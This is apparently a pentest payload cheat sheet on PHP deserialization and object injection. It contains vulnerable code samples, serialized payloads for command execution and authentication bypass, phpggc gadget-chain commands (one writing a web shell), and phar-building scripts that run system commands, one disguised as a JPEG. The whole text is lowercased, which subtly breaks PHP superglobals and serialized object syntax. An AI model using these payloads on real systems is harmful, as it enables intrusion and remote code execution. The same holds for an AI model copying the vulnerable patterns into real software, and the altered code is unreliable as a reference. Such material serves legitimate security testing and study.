# php deserialization

> php object injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as code injection, sql injection, path traversal and application denial of service, depending on the context. the vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() php function. since php allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary php object(s) injection into the application scope.


## summary

* [general concept](#general-concept)
* [authentication bypass](#authentication-bypass)
* [object injection](#object-injection)
* [finding and using gadgets](#finding-and-using-gadgets)
* [phar deserialization](#phar-deserialization)
* [real world examples](#real-world-examples)
* [references](#references)


## general concept

the following magic methods will help you for a php object injection

* `__wakeup()` when an object is unserialized.
* `__destruct()` when an object is deleted.
* `__tostring()` when an object is converted to a string.

also you should check the `wrapper phar://` in [file inclusion](https://github.com/swisskyrepo/payloadsallthethings/tree/master/file%20inclusion#wrapper-phar) which use a php object injection.


vulnerable code:

```php
<?php 
    class phpobjectinjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_request['r'])){  
        $var1=unserialize($_request['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

craft a payload using existing code inside the application.

* basic serialized data
    ```php
    a:2:{i:0;s:4:"xvwa";i:1;s:33:"xtreme vulnerable web application";}
    ```

* command execution
    ```php
    string(68) "o:18:"phpobjectinjection":1:{s:6:"inject";s:17:"system('whoami');";}"
    ```


## authentication bypass

### type juggling

vulnerable code:

```php
<?php
$data = unserialize($_cookie['auth']);

if ($data['username'] == $adminname && $data['password'] == $adminpassword) {
    $admin = true;
} else {
    $admin = false;
}
```

payload:

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

because `true == "str"` is true.


## object injection

vulnerable code:

```php
<?php
class objectexample
{
  var $guess;
  var $secretcode;
}

$obj = unserialize($_get['input']);

if($obj) {
    $obj->secretcode = rand(500000,999999);
    if($obj->guess === $obj->secretcode) {
        echo "win";
    }
}
?>
```

payload:

```php
o:13:"objectexample":2:{s:10:"secretcode";n;s:5:"guess";r:2;}
```

we can do an array like this:

```php
a:2:{s:10:"admin_hash";n;s:4:"hmac";r:2;}
```


## finding and using gadgets

also called `"php pop chains"`, they can be used to gain rce on the system.

* in php source code, look for `unserialize()` function.
* interesting [magic methods](https://www.php.net/manual/en/language.oop5.magic.php) such as `__construct()`, `__destruct()`, `__call()`, `__callstatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__tostring()`, `__invoke()`, `__set_state()`, `__clone()`, and `__debuginfo()`:
    * `__construct()`: php allows developers to declare constructor methods for classes. classes which have a constructor method call this method on each newly-created object, so it is suitable for any initialization that the object may need before it is used. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
    * `__destruct()`: the destructor method will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence. [php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
    * `__call(string $name, array $arguments)`: the `$name` argument is the name of the method being called. the `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
    * `__callstatic(string $name, array $arguments)`: the `$name` argument is the name of the method being called. the `$arguments` argument is an enumerated array containing the parameters passed to the `$name`'ed method. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
    * `__get(string $name)`: `__get()` is utilized for reading data from inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
    * `__set(string $name, mixed $value)`: `__set()` is run when writing data to inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
    * `__isset(string $name)`: `__isset()` is triggered by calling `isset()` or `empty()` on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
    * `__unset(string $name)`: `__unset()` is invoked when `unset()` is used on inaccessible (protected or private) or non-existing properties. [php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
    * `__sleep()`: `serialize()` checks if the class has a function with the magic name `__sleep()`. if so, that function is executed prior to any serialization. it can clean up the object and is supposed to return an array with the names of all variables of that object that should be serialized. if the method doesn't return anything then **null** is serialized and **e_notice** is issued.[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
    * `__wakeup()`: `unserialize()` checks for the presence of a function with the magic name `__wakeup()`. if present, this function can reconstruct any resources that the object may have. the intended use of `__wakeup()` is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
    * `__serialize()`: `serialize()` checks if the class has a function with the magic name `__serialize()`. if so, that function is executed prior to any serialization. it must construct and return an associative array of key/value pairs that represent the serialized form of the object. if no array is returned a typeerror will be thrown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
    * `__unserialize(array $data)`: this function will be passed the restored array that was returned from __serialize().  [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
    * `__tostring()`: the __tostring() method allows a class to decide how it will react when it is treated like a string [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
    * `__invoke()`: the `__invoke()` method is called when a script tries to call an object as a function. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
    * `__set_state(array $properties)`: this static method is called for classes exported by `var_export()`. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
    * `__clone()`: once the cloning is complete, if a `__clone()` method is defined, then the newly created object's `__clone()` method will be called, to allow any necessary properties that need to be changed. [php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
    * `__debuginfo()`: this method is called by `var_dump()` when dumping an object to get the properties that should be shown. if the method isn't defined on an object, then all public, protected and private properties will be shown. [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)


[ambionics/phpggc](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:

- laravel
- symfony
- swiftmailer
- monolog
- slimphp
- doctrine
- guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc monolog/rce2 system 'id' -p phar -o /tmp/testinfo.ini
```

## phar deserialization

using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.

a valid phar includes four elements:

1. **stub**: the stub is a chunk of php code which is executed when the file is accessed in an executable context. at a minimum, the stub must contain `__halt_compiler();` at its conclusion. otherwise, there are no restrictions on the contents of a phar stub.
2. **manifest**: contains metadata about the archive and its contents.
3. **file contents**: contains the actual files in the archive.
4. **signature**(optional): for verifying archive integrity.


* example of a phar creation in order to exploit a custom `pdfgenerator`.
    ```php
    <?php
    class pdfgenerator { }

    //create a new instance of the dummy class and modify its property
    $dummy = new pdfgenerator();
    $dummy->callback = "passthru";
    $dummy->filename = "uname -a > pwned"; //our payload

    // delete any existing phar archive with that name
    @unlink("poc.phar");

    // create a new archive
    $poc = new phar("poc.phar");

    // add all write operations to a buffer, without modifying the archive on disk
    $poc->startbuffering();

    // set the stub
    $poc->setstub("<?php echo 'here is the stub!'; __halt_compiler();");

    /* add a new file in the archive with "text" as its content*/
    $poc["file"] = "text";
    // add the dummy object to the metadata. this will be serialized
    $poc->setmetadata($dummy);
    // stop buffering and write changes to disk
    $poc->stopbuffering();
    ?>
    ```

* example of a phar creation with a `jpeg` magic byte header since there is no restriction on the content of stub.
    ```php
    <?php
    class anyclass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // create new phar
    $phar = new phar('test.phar');
    $phar->startbuffering();
    $phar->addfromstring('test.txt', 'text');
    $phar->setstub("\xff\xd8\xff\n<?php __halt_compiler(); ?>");

    // add object of any class as meta data
    $object = new anyclass('whoami');
    $phar->setmetadata($object);
    $phar->stopbuffering();
    ```


## real world examples

* [vanilla forums importcontroller index file_exists unserialize remote code execution vulnerability - steven seeley](https://hackerone.com/reports/410237)
* [vanilla forums xenforo password splithash unserialize remote code execution vulnerability - steven seeley](https://hackerone.com/reports/410212)
* [vanilla forums domgetimages getimagesize unserialize remote code execution vulnerability (critical) - steven seeley](https://hackerone.com/reports/410882)
* [vanilla forums gdn_format unserialize() remote code execution vulnerability - steven seeley](https://hackerone.com/reports/407552)


## references

- [ctf writeup: php object injection in kaspersky ctf - jaimin gohel - november 24, 2018](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
- [ecsc 2019 quals team france - jack the ripper web - noraj - may 22, 2019](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-jack-the-ripper-web)
- [finding a pop chain on a common symfony bundle: part 1 - rémi matasse - september 12, 2023](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
- [finding a pop chain on a common symfony bundle: part 2 - rémi matasse - october 11, 2023](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)
- [finding php serialization gadget chain - dg'hack unserial killer - xanhacks - august 11, 2022](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
- [how to exploit the phar deserialization vulnerability - alexandru postolache - may 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
- [phar:// deserialization - hacktricks - july 19, 2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
- [php deserialization attacks and a new gadget chain in laravel - mathieu farrell - february 13, 2024](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
- [php generic gadget - charles fol - july 4, 2017](https://www.ambionics.io/blog/php-generic-gadget-chains)
- [php internals book - serialization - jpauli - june 15, 2013](http://www.phpinternalsbook.com/classes_objects/serialization.html)
- [php object injection - egidio romano - april 24, 2020](https://www.owasp.org/index.php/php_object_injection)
- [php pop chains - achieving rce with pop chain exploits. - vickie li - september 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
- [php unserialize - php.net - march 29, 2001](http://php.net/manual/en/function.unserialize.php)
- [poc2009 shocking news in php exploitation - stefan esser - may 23, 2015](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/poc2009-shockingnewsinphpexploitation.pdf)
- [rusty joomla rce unserialize overflow - alessandro groppo - october 3, 2019](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
- [tsulott web challenge write-up - meepwn ctf - rawsec - july 15, 2017](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#tsulott-web)
- [utilizing code reuse/rop in php - stefan esser - june 15, 2020](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/utilizing-code-reuse-or-return-oriented-programming-in-php-application-exploits.pdf)